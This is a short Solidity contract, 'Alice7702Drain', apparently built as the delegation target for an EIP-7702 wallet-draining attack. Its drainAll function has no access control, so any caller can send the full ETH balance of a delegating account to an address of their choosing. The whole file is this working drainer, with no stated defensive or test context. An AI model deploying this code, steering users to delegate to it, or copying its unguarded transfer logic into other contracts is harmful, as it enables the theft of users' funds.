// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Alice7702Drain {
    event Drained(address indexed caller, address indexed receiver, uint256 amount);

    receive() external payable {}

    fallback() external payable {}

    function drainAll(address payable receiver) external {
        uint256 amount = address(this).balance;
        require(amount > 0, "empty delegated balance");

        (bool ok,) = receiver.call{value: amount}("");
        require(ok, "drain failed");

        emit Drained(msg.sender, receiver, amount);
    }
}
